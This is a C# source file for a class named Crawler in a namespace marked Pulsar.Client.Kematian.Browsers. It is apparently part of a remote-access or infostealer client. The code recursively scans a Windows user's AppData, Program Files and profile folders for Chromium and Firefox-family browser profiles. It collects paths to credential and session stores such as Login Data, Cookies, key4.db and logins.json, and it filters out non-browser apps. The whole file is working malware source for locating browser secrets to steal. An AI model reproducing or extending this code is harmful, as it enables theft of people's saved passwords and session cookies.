using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Pulsar.Client.Kematian.Browsers.Helpers
{
    public class Crawler
    {
        private const int MAX_DEPTH = 3;
        private static readonly string[] profileNames = { "Default", "Profile" };
        private static readonly string[] commonProgramDirs = { 
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)
        };
        private static readonly string[] commonAppDataDirs = {
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        };
        private static readonly string[] additionalRootDirs = {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Documents"),
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        };
        private static readonly string[] chromiumProfileFiles = {
            "Cookies", "History", "Web Data", "Login Data", "Bookmarks", "Preferences"
        };
        private static readonly string[] chromiumRequiredFiles = {
            "Cookies", "History", "Login Data" 
        };
        private static readonly string[] geckoProfileFiles = {
            "cookies.sqlite", "places.sqlite", "key4.db", "logins.json", "formhistory.sqlite",
            "content-prefs.sqlite", "extensions.json", "permissions.sqlite", "prefs.js",
            "addons.json", "cert9.db", "xulstore.json"
        };
        private static readonly string[] geckoRequiredFiles = {
            "cookies.sqlite", "places.sqlite"
        };
        private readonly HashSet<string> _scannedDirs = new HashSet<string>();
        private static readonly string[] altUserDataFolders = {
            "User Data", "UserData", "user-data", "BrowserData", "Browser Data", "Data"
        };
        private static readonly string[] webViewTerms = {
            "webview", "ebwebview", "edgewebview", "chromewebview", "chakrawebview", "embedded", 
            "component", "electron", ".net", "runtime", "msedge_", "microsoft-edge", "spotify",
            "discord", "teams", "slack", "twitch", "vscode", "whatsapp", "telegram"
        };
        private static readonly string[] appNames = {
            "spotify", "discord", "slack", "teams", "vscode", "atom", "visual studio",
            "office", "photoshop", "adobe", "twitch", "steam", "epic games", "whatsapp",
            "telegram", "skype", "zoom"
        };

        public List<ChromiumBrowserPath> GetChromiumBrowsers()
        {
            var browsers = new ConcurrentBag<ChromiumBrowserPath>();
            _scannedDirs.Clear();
            
            var searchTasks = new List<Task>();
            
            foreach (var appDataDir in commonAppDataDirs)
            {
                searchTasks.Add(SearchFolderForChromium(appDataDir, browsers, 0));
            }
            
            foreach (var programDir in commonProgramDirs)
            {
                if (Directory.Exists(programDir))
                    searchTasks.Add(SearchFolderForChromium(programDir, browsers, 0));
            }
            
            foreach (var rootDir in additionalRootDirs)
            {
                if (Directory.Exists(rootDir))
                    searchTasks.Add(SearchFolderForChromium(rootDir, browsers, 0));
            }
            
            Task.WhenAll(searchTasks).GetAwaiter().GetResult();
            return browsers.ToList();
        }

        private async Task SearchFolderForChromium(string rootDir, ConcurrentBag<ChromiumBrowserPath> browsers, int depth)
        {
            if (depth > MAX_DEPTH) return;
            if (ContainsWebViewTerm(rootDir)) return;

            try
            {
                await CheckForChromiumBrowser(rootDir, browsers);
                
                string[] subDirs;
                try {
                    subDirs = Directory.GetDirectories(rootDir);
                } catch {
                    return;
                }
                
                var dirTasks = new List<Task>();
                foreach (var dir in subDirs)
                {
                    if (!Directory.Exists(dir)) continue;
                    if (ContainsWebViewTerm(dir)) continue;
                    
                    string dirName = Path.GetFileName(dir).ToLowerInvariant();
                    
                    if (dirName == "temp" || dirName == "tmp" || dirName.Contains("temporary") || 
                        dirName == "windows" || dirName == "program files" || dirName == "program files (x86)" ||
                        dirName == "logs" || dirName == "winsparkle" || dirName == "local" || 
                        dirName == "updates" || dirName == "crash reports" || dirName == "ebwebview" ||
                        dirName.Contains("webview") || dirName.Contains("runtime") || dirName.Contains("electron"))
                    {
                        if (depth > 0) continue;
                    }
                    
                    dirTasks.Add(SearchFolderForChromium(dir, browsers, depth + 1));
                }
                
                if (dirTasks.Count > 0)
                    await Task.WhenAll(dirTasks);
            }
            catch { }
        }
        
        private async Task CheckForChromiumBrowser(string directory, ConcurrentBag<ChromiumBrowserPath> browsers)
        {
            try
            {
                if (ContainsWebViewTerm(directory)) return;
                
                lock (_scannedDirs)
                {
                    if (_scannedDirs.Contains(directory)) return;
                    _scannedDirs.Add(directory);
                }
                
                string dirName = Path.GetFileName(directory).ToLowerInvariant();
                if (dirName == "temp" || dirName == "tmp" || dirName.Contains("temporary") || 
                    dirName == "crash" || dirName.Contains("update") || dirName == "winsparkle" || 
                    dirName == "logs" || dirName == "cache" || dirName.EndsWith(".old") ||
                    dirName.Contains("sandbox") || dirName.Contains("test") || dirName == "ebwebview" ||
                    dirName.Contains("webview") || dirName.Contains("electron") || dirName.Contains("runtime"))
                {
                    return;
                }
                
                foreach (var appName in appNames)
                {
                    if (dirName.Contains(appName) || directory.ToLowerInvariant().Contains("\\" + appName + "\\"))
                        return;
                }
                
                bool isUserData = false;
                string userDataPath = "";
                
                foreach (var folderName in altUserDataFolders)
                {
                    if (Path.GetFileName(directory).Equals(folderName, StringComparison.OrdinalIgnoreCase))
                    {
                        isUserData = true;
                        userDataPath = directory;
                        break;
                    }
                    
                    string tempPath = Path.Combine(directory, folderName);
                    if (Directory.Exists(tempPath))
                    {
                        userDataPath = tempPath;
                        break;
                    }
                }
                
                if (!string.IsNullOrEmpty(userDataPath))
                {
                    string localStatePath = Path.Combine(userDataPath, "Local State");
                    if (File.Exists(localStatePath))
                    {
                        var profiles = await FindChromiumProfiles(userDataPath);
                        if (profiles.Length > 0)
                        {
                            browsers.Add(new ChromiumBrowserPath
                            {
                                LocalStatePath = localStatePath,
                                ProfilePath = userDataPath,
                                Profiles = profiles
                            });
                            return;
                        }
                    }
                    else
                    {
                        var profiles = await FindChromiumProfiles(userDataPath);
                        if (profiles.Length > 0)
                        {
                            browsers.Add(new ChromiumBrowserPath
                            {
                                LocalStatePath = "",
                                ProfilePath = userDataPath,
                                Profiles = profiles
                            });
                            return;
                        }
                    }
                }

                if (await IsChromiumProfileDirectory(directory))
                {
                    string parentDir = Directory.GetParent(directory)?.FullName;
                    if (parentDir != null)
                    {
                        string localStatePath = Path.Combine(parentDir, "Local State");
                        var profiles = new ConcurrentDictionary<string, ChromiumProfile>();
                        if (await TryAddChromiumProfileWithKey(directory, profiles))
                        {
                            browsers.Add(new ChromiumBrowserPath
                            {
                                LocalStatePath = File.Exists(localStatePath) ? localStatePath : "",
                                ProfilePath = parentDir,
                                Profiles = profiles.Values.ToArray()
                            });
                            return;
                        }
                    }
                }
                
                if (Directory.Exists(directory))
                {
                    try
                    {
                        var profileDirs = new List<string>();
                        
                        foreach (var subdir in Directory.GetDirectories(directory, "profile*", SearchOption.TopDirectoryOnly))
                        {
                            if (await IsChromiumProfileDirectory(subdir))
                            {
                                profileDirs.Add(subdir);
                            }
                        }
                        
                        foreach (var subdir in Directory.GetDirectories(directory, "default", SearchOption.TopDirectoryOnly))
                        {
                            if (await IsChromiumProfileDirectory(subdir))
                            {
                                profileDirs.Add(subdir);
                            }
                        }
                        
                        if (profileDirs.Count > 0)
                        {
                            var profiles = new ConcurrentDictionary<string, ChromiumProfile>();
                            var profileTasks = new List<Task>();
                            
                            foreach (var profileDir in profileDirs)
                            {
                                profileTasks.Add(TryAddChromiumProfileWithKey(profileDir, profiles));
                            }
                            
                            await Task.WhenAll(profileTasks);
                            
                            if (profiles.Count > 0)
                            {
                                browsers.Add(new ChromiumBrowserPath
                                {
                                    LocalStatePath = "",
                                    ProfilePath = directory,
                                    Profiles = profiles.Values.ToArray()
                                });
                                return;
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private async Task<bool> IsChromiumProfileDirectory(string directory)
        {
            if (!Directory.Exists(directory)) return false;
            
            string dirName = Path.GetFileName(directory).ToLowerInvariant();
            foreach (var appName in appNames)
            {
                if (dirName.Contains(appName) || directory.ToLowerInvariant().Contains("\\" + appName + "\\"))
                    return false;
            }
            
            int fileCount = 0;
            int requiredFileCount = 0;
            
            foreach (var file in chromiumProfileFiles)
            {
                string filePath = Path.Combine(directory, file);
                bool exists = await Task.Run(() => File.Exists(filePath));
                
                if (exists)
                {
                    fileCount++;
                    if (chromiumRequiredFiles.Contains(file))
                        requiredFileCount++;
                }
            }
            
            float confidence = (float)fileCount / chromiumProfileFiles.Length * 100;
            Debug.WriteLine($"Chromium profile confidence for {directory}: {confidence:F1}%, required files: {requiredFileCount}/{chromiumRequiredFiles.Length}");
            
            return confidence >= 50 && requiredFileCount >= 1;
        }
        
        private async Task<ChromiumProfile[]> FindChromiumProfiles(string userDataDir)
        {
            var profiles = new ConcurrentDictionary<string, ChromiumProfile>();
            
            try
            {
                string[] subDirs;
                try {
                    subDirs = Directory.GetDirectories(userDataDir);
                } catch {
                    return new ChromiumProfile[0];
                }

                var profileTasks = new List<Task>();
                foreach (var dir in subDirs)
                {
                    string dirName = Path.GetFileName(dir);
                    
                    if (dirName.StartsWith("Default", StringComparison.OrdinalIgnoreCase) || 
                        dirName.StartsWith("Profile", StringComparison.OrdinalIgnoreCase) ||
                        dirName.Contains("Profile") ||
                        await IsChromiumProfileDirectory(dir))
                    {
                        profileTasks.Add(TryAddChromiumProfileWithKey(dir, profiles));
                    }
                }

                if (profileTasks.Count > 0)
                    await Task.WhenAll(profileTasks);
            }
            catch { }

            return profiles.Values.ToArray();
        }

        private async Task<bool> TryAddChromiumProfileWithKey(string profileDir, ConcurrentDictionary<string, ChromiumProfile> profiles)
        {
            try
            {
                if (profileDir.Contains(".ini") || profileDir.Contains(".log") || 
                    profileDir.Contains(".json") || profileDir.Contains(".temp") ||
                    profileDir.Contains("updater") || profileDir.Contains("installer") ||
                    ContainsWebViewTerm(profileDir)) 
                {
                    return false;
                }
                
                string profileName = Path.GetFileName(profileDir);
                
                foreach (var appName in appNames)
                {
                    if (profileName.Contains(appName) || profileDir.ToLowerInvariant().Contains("\\" + appName + "\\"))
                        return false;
                }
                
                Debug.WriteLine($"Checking potential Chromium profile: {profileDir}");
                
                string webDataPath = Path.Combine(profileDir, "Web Data");
                string cookiesPath = Path.Combine(profileDir, "Cookies");
                string historyPath = Path.Combine(profileDir, "History");
                string loginDataPath = Path.Combine(profileDir, "Login Data");
                string bookmarksPath = Path.Combine(profileDir, "Bookmarks");
                string preferencesPath = Path.Combine(profileDir, "Preferences");
                
                bool[] fileExists = await Task.WhenAll(
                    Task.Run(() => File.Exists(webDataPath)),
                    Task.Run(() => File.Exists(cookiesPath)),
                    Task.Run(() => File.Exists(historyPath)),
                    Task.Run(() => File.Exists(loginDataPath)),
                    Task.Run(() => File.Exists(bookmarksPath)),
                    Task.Run(() => File.Exists(preferencesPath))
                );
                
                bool hasWebData = fileExists[0];
                bool hasCookies = fileExists[1];
                bool hasHistory = fileExists[2];
                bool hasLoginData = fileExists[3];
                bool hasBookmarks = fileExists[4];
                bool hasPreferences = fileExists[5];
                
                if (!hasCookies)
                {
                    string networkDir = Path.Combine(profileDir, "Network");
                    if (Directory.Exists(networkDir))
                    {
                        string networkCookiesPath = Path.Combine(networkDir, "Cookies");
                        if (await Task.Run(() => File.Exists(networkCookiesPath)))
                        {
                            hasCookies = true;
                            cookiesPath = networkCookiesPath;
                        }
                    }
                }
                
                if (!hasCookies)
                {
                    try
                    {
                        var cookiesFiles = await Task.Run(() => Directory.GetFiles(profileDir, "Cookies", SearchOption.AllDirectories)
                            .Where(f => !f.Contains("\\Journal\\") && !f.Contains("\\temp\\") && !f.Contains(".old") && !f.Contains("-journal"))
                            .ToList());
                            
                        if (cookiesFiles.Count > 0)
                        {
                            hasCookies = true;
                            cookiesPath = cookiesFiles[0];
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error searching for cookies: {ex.Message}");
                    }
                }
                
                if (!hasHistory)
                {
                    try
                    {
                        var historyFiles = await Task.Run(() => Directory.GetFiles(profileDir, "History", SearchOption.AllDirectories)
                            .Where(f => !f.Contains("\\Journal\\") && !f.Contains("\\temp\\") && !f.Contains(".old") && !f.Contains("-journal"))
                            .ToList());
                            
                        if (historyFiles.Count > 0)
                        {
                            hasHistory = true;
                            historyPath = historyFiles[0];
                        }
                    }
                    catch { }
                }
                
                int presentFileCount = 0;
                if (hasWebData) presentFileCount++;
                if (hasCookies) presentFileCount++;
                if (hasHistory) presentFileCount++;
                if (hasLoginData) presentFileCount++;
                if (hasBookmarks) presentFileCount++;
                if (hasPreferences) presentFileCount++;
                
                float confidence = (float)presentFileCount / chromiumProfileFiles.Length * 100;
                
                int requiredFileCount = 0;
                if (hasCookies) requiredFileCount++;
                if (hasHistory) requiredFileCount++;
                if (hasLoginData) requiredFileCount++;
                
                Debug.WriteLine($"Chromium profile validation for {profileDir}: {confidence:F1}%, required files: {requiredFileCount}/{chromiumRequiredFiles.Length}");
                
                bool isValidProfile = confidence >= 50 && requiredFileCount >= 1;
                
                if (isValidProfile)
                {
                    var profile = new ChromiumProfile
                    {
                        WebData = hasWebData ? webDataPath : string.Empty,
                        Cookies = hasCookies ? cookiesPath : string.Empty,
                        History = hasHistory ? historyPath : string.Empty,
                        LoginData = hasLoginData ? loginDataPath : string.Empty,
                        Bookmarks = hasBookmarks ? bookmarksPath : string.Empty,
                        Name = profileName
                    };
                    
                    profiles[profileDir] = profile;
                    return true;
                }
            }
            catch (Exception ex) 
            {
                Debug.WriteLine($"Error in adding chromium profile: {ex.Message}");
            }
            
            return false;
        }

        public List<GeckoBrowserPath> GetGeckoBrowsers()
        {
            var browsers = new ConcurrentBag<GeckoBrowserPath>();
            _scannedDirs.Clear();
            
            var searchTasks = new List<Task>();
            
            foreach (var appDataDir in commonAppDataDirs)
            {
                searchTasks.Add(SearchFolderForGecko(appDataDir, browsers, 0));
            }
            
            foreach (var programDir in commonProgramDirs)
            {
                if (Directory.Exists(programDir))
                    searchTasks.Add(SearchFolderForGecko(programDir, browsers, 0));
            }
            
            foreach (var rootDir in additionalRootDirs)
            {
                if (Directory.Exists(rootDir))
                    searchTasks.Add(SearchFolderForGecko(rootDir, browsers, 0));
            }
            
            Task.WhenAll(searchTasks).GetAwaiter().GetResult();

            var profilesIniTasks = new List<Task>();
            foreach (var appDataDir in commonAppDataDirs)
            {
                profilesIniTasks.Add(SearchForProfilesIni(appDataDir, browsers, 0));
            }
            foreach (var rootDir in additionalRootDirs)
            {
                if (Directory.Exists(rootDir))
                    profilesIniTasks.Add(SearchForProfilesIni(rootDir, browsers, 0));
            }
            Task.WhenAll(profilesIniTasks).GetAwaiter().GetResult();

            return browsers.ToList();
        }

        private async Task SearchForProfilesIni(string rootDir, ConcurrentBag<GeckoBrowserPath> browsers, int depth)
        {
            if (depth > MAX_DEPTH) return;
            if (ContainsWebViewTerm(rootDir)) return;

            try
            {
                string[] files;
                try {
                    files = Directory.GetFiles(rootDir, "profiles.ini");
                } catch {
                    return;
                }
                
                var fileTasks = new List<Task>();
                foreach (var file in files)
                {
                    string directory = Path.GetDirectoryName(file);
                    if (directory != null && !ContainsWebViewTerm(directory))
                    {
                        fileTasks.Add(CheckGeckoProfilesIni(file, directory, browsers));
                    }
                }
                
                if (fileTasks.Count > 0)
                    await Task.WhenAll(fileTasks);
                
                string[] subDirs;
                try {
                    subDirs = Directory.GetDirectories(rootDir);
                } catch {
                    return;
                }
                
                var dirTasks = new List<Task>();
                foreach (var dir in subDirs)
                {
                    if (!Directory.Exists(dir)) continue;
                    if (ContainsWebViewTerm(dir)) continue;
                    
                    string dirName = Path.GetFileName(dir).ToLowerInvariant();
                    
                    if (dirName == "temp" || dirName == "tmp" || dirName.Contains("temporary") || 
                        dirName == "windows" || dirName == "program files" || dirName == "program files (x86)" ||
                        dirName == "ebwebview" || dirName.Contains("webview"))
                    {
                        if (depth > 0) continue;
                    }
                    
                    dirTasks.Add(SearchForProfilesIni(dir, browsers, depth + 1));
                }
                
                if (dirTasks.Count > 0)
                    await Task.WhenAll(dirTasks);
            }
            catch { }
        }

        private async Task SearchFolderForGecko(string rootDir, ConcurrentBag<GeckoBrowserPath> browsers, int depth)
        {
            if (depth > MAX_DEPTH) return;
            if (ContainsWebViewTerm(rootDir)) return;

            try
            {
                await CheckForGeckoBrowser(rootDir, browsers);
                
                string[] subDirs;
                try {
                    subDirs = Directory.GetDirectories(rootDir);
                } catch {
                    return;
                }
                
                var dirTasks = new List<Task>();
                foreach (var dir in subDirs)
                {
                    if (!Directory.Exists(dir)) continue;
                    if (ContainsWebViewTerm(dir)) continue;
                    
                    string dirName = Path.GetFileName(dir).ToLowerInvariant();
                    
                    if (dirName == "temp" || dirName == "tmp" || dirName.Contains("temporary") || 
                        dirName == "windows" || dirName == "program files" || dirName == "program files (x86)" ||
                        dirName == "logs" || dirName == "winsparkle" || dirName == "local" || 
                        dirName == "updates" || dirName == "crash reports" || dirName == "ebwebview" ||
                        dirName.Contains("webview") || dirName.Contains("runtime") || dirName.Contains("electron"))
                    {
                        if (depth > 0) continue;
                    }
                    
                    dirTasks.Add(SearchFolderForGecko(dir, browsers, depth + 1));
                }
                
                if (dirTasks.Count > 0)
                    await Task.WhenAll(dirTasks);
            }
            catch { }
        }
        
        private async Task CheckGeckoProfilesIni(string iniPath, string directory, ConcurrentBag<GeckoBrowserPath> browsers)
        {
            try
            {
                lock (_scannedDirs)
                {
                    if (_scannedDirs.Contains(directory)) return;
                    _scannedDirs.Add(directory);
                }
                
                var profiles = await FindGeckoProfilesFromIni(iniPath, directory);
                if (profiles.Length > 0)
                {
                    browsers.Add(new GeckoBrowserPath {
                        ProfilesPath = directory,
                        Profiles = profiles
                    });
                }
            }
            catch { }
        }
        
        private async Task CheckForGeckoBrowser(string directory, ConcurrentBag<GeckoBrowserPath> browsers)
        {
            try
            {
                if (ContainsWebViewTerm(directory)) return;
                
                lock (_scannedDirs)
                {
                    if (_scannedDirs.Contains(directory)) return;
                    _scannedDirs.Add(directory);
                }
                
                string profilesIni = Path.Combine(directory, "profiles.ini");
                
                if (File.Exists(profilesIni))
                {
                    var profiles = await FindGeckoProfilesFromIni(profilesIni, directory);
                    if (profiles.Length > 0)
                    {
                        browsers.Add(new GeckoBrowserPath {
                            ProfilesPath = directory,
                            Profiles = profiles
                        });
                        return;
                    }
                }
                
                if (await IsGeckoProfileDirectory(directory))
                {
                    var profile = await CreateGeckoProfile(directory);
                    if (!string.IsNullOrEmpty(profile.Path))
                    {
                        browsers.Add(new GeckoBrowserPath {
                            ProfilesPath = directory,
                            Profiles = new[] { profile }
                        });
                        return;
                    }
                }
                
                string profilesDir = Path.Combine(directory, "Profiles");
                if (Directory.Exists(profilesDir))
                {
                    var profilesList = new List<GeckoProfile>();
                    var profileTasks = new List<Task<GeckoProfile>>();
                    
                    foreach (var subDir in Directory.GetDirectories(profilesDir))
                    {
                        if (await IsGeckoProfileDirectory(subDir))
                        {
                            profileTasks.Add(CreateGeckoProfile(subDir));
                        }
                    }
                    
                    if (profileTasks.Count > 0)
                    {
                        var completedProfiles = await Task.WhenAll(profileTasks);
                        foreach (var profile in completedProfiles)
                        {
                            if (!string.IsNullOrEmpty(profile.Path))
                            {
                                profilesList.Add(profile);
                            }
                        }
                        
                        if (profilesList.Count > 0)
                        {
                            browsers.Add(new GeckoBrowserPath {
                                ProfilesPath = directory,
                                Profiles = profilesList.ToArray()
                            });
                            return;
                        }
                    }
                }

                var directoryProfiles = new List<GeckoProfile>();
                var dirProfileTasks = new List<Task<GeckoProfile>>();
                
                foreach (var subDir in Directory.GetDirectories(directory))
                {
                    if (await IsGeckoProfileDirectory(subDir))
                    {
                        dirProfileTasks.Add(CreateGeckoProfile(subDir));
                    }
                }
                
                if (dirProfileTasks.Count > 0)
                {
                    var completedProfiles = await Task.WhenAll(dirProfileTasks);
                    foreach (var profile in completedProfiles)
                    {
                        if (!string.IsNullOrEmpty(profile.Path))
                        {
                            directoryProfiles.Add(profile);
                        }
                    }
                    
                    if (directoryProfiles.Count > 0)
                    {
                        browsers.Add(new GeckoBrowserPath {
                            ProfilesPath = directory,
                            Profiles = directoryProfiles.ToArray()
                        });
                    }
                }
            }
            catch { }
        }
        
        private async Task<GeckoProfile[]> FindGeckoProfilesFromIni(string iniPath, string profilesDir)
        {
            var profiles = new List<GeckoProfile>();

            try
            {
                var iniContent = await Task.Run(() => File.ReadAllText(iniPath));
                var profilePaths = await ParseProfilePaths(iniContent, profilesDir);
                
                var profileTasks = new List<Task<GeckoProfile>>();
                foreach (var profilePath in profilePaths)
                {
                    if (Directory.Exists(profilePath))
                    {
                        profileTasks.Add(CreateGeckoProfile(profilePath));
                    }
                }
                
                if (profileTasks.Count > 0)
                {
                    var completedProfiles = await Task.WhenAll(profileTasks);
                    foreach (var profile in completedProfiles)
                    {
                        if (!string.IsNullOrEmpty(profile.Path))
                {
                    profiles.Add(profile);
                }
            }
                }
            }
            catch { }

            return profiles.ToArray();
        }
        
        private async Task<bool> IsGeckoProfileDirectory(string directory)
        {
            if (!Directory.Exists(directory)) return false;
            
            try
            {
                int fileCount = 0;
                int requiredFileCount = 0;
                
                foreach (var file in geckoProfileFiles)
                {
                    string filePath = Path.Combine(directory, file);
                    bool exists = await Task.Run(() => File.Exists(filePath));
                    
                    if (exists)
                    {
                        fileCount++;
                        if (geckoRequiredFiles.Contains(file))
                            requiredFileCount++;
                    }
                }
                
                float confidence = (float)fileCount / geckoProfileFiles.Length * 100;
                return confidence >= 50 && requiredFileCount >= 1;
            }
            catch { }
            
            return false;
        }
        
        private async Task<GeckoProfile> CreateGeckoProfile(string profileDir)
        {
            try
            {
                string cookiesPath = Path.Combine(profileDir, "cookies.sqlite");
                string historyPath = Path.Combine(profileDir, "places.sqlite");
                string key4Path = Path.Combine(profileDir, "key4.db");
                string loginJsonPath = Path.Combine(profileDir, "logins.json");
                string formHistoryPath = Path.Combine(profileDir, "formhistory.sqlite");
                string contentPrefsPath = Path.Combine(profileDir, "content-prefs.sqlite");
                string extensionsPath = Path.Combine(profileDir, "extensions.json");
                string permissionsPath = Path.Combine(profileDir, "permissions.sqlite");
                string prefsJsPath = Path.Combine(profileDir, "prefs.js");
                
                bool[] fileExists = await Task.WhenAll(
                    Task.Run(() => File.Exists(cookiesPath)),
                    Task.Run(() => File.Exists(historyPath)),
                    Task.Run(() => File.Exists(key4Path)),
                    Task.Run(() => File.Exists(loginJsonPath)),
                    Task.Run(() => File.Exists(formHistoryPath)),
                    Task.Run(() => File.Exists(contentPrefsPath)),
                    Task.Run(() => File.Exists(extensionsPath)),
                    Task.Run(() => File.Exists(permissionsPath)),
                    Task.Run(() => File.Exists(prefsJsPath))
                );
                
                int validFiles = fileExists.Count(exists => exists);
                float confidence = (float)validFiles / geckoProfileFiles.Length * 100;
                
                int requiredFileCount = 0;
                if (fileExists[0]) requiredFileCount++;
                if (fileExists[1]) requiredFileCount++;
                
                bool isValidProfile = confidence >= 50 && requiredFileCount >= 1;
                
                if (isValidProfile)
                {
                    return new GeckoProfile
                    {
                        Cookies = fileExists[0] ? cookiesPath : string.Empty,
                        History = fileExists[1] ? historyPath : string.Empty,
                        Key4DB = fileExists[2] ? key4Path : string.Empty,
                        LoginsJson = fileExists[3] ? loginJsonPath : string.Empty,
                        Name = Path.GetFileName(profileDir),
                        Path = profileDir
                    };
                }
            }
            catch { }
            
            return new GeckoProfile();
        }
        
        private async Task<string[]> ParseProfilePaths(string iniContent, string profilesDir)
        {
            var paths = new List<string>();
            var lines = iniContent.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            string currentPath = "";
            bool isRelative = false;
            
            await Task.Run(() => {
                foreach (var line in lines)
                {
                    if (line.StartsWith("[Profile", StringComparison.OrdinalIgnoreCase))
                    {
                        if (!string.IsNullOrEmpty(currentPath))
                        {
                            paths.Add(isRelative ? Path.Combine(profilesDir, currentPath) : currentPath);
                        }
                        currentPath = "";
                        isRelative = false;
                    }
                    else if (line.StartsWith("Path=", StringComparison.OrdinalIgnoreCase))
                    {
                        currentPath = line.Substring(5).Trim();
                    }
                    else if (line.StartsWith("IsRelative=", StringComparison.OrdinalIgnoreCase))
                    {
                        isRelative = line.Substring(11).Trim() == "1";
                    }
                }
                
                if (!string.IsNullOrEmpty(currentPath))
                {
                    paths.Add(isRelative ? Path.Combine(profilesDir, currentPath) : currentPath);
                }
            });
            
            return paths.ToArray();
        }

        private bool ContainsWebViewTerm(string path)
        {
            string lowerPath = path.ToLowerInvariant();
            
            foreach (var appName in appNames)
            {
                if (lowerPath.Contains("\\" + appName + "\\"))
                    return true;
            }
            
            foreach (var term in webViewTerms)
            {
                if (lowerPath.Contains(term))
                    return true;
            }
            
            return false;
        }
    }
}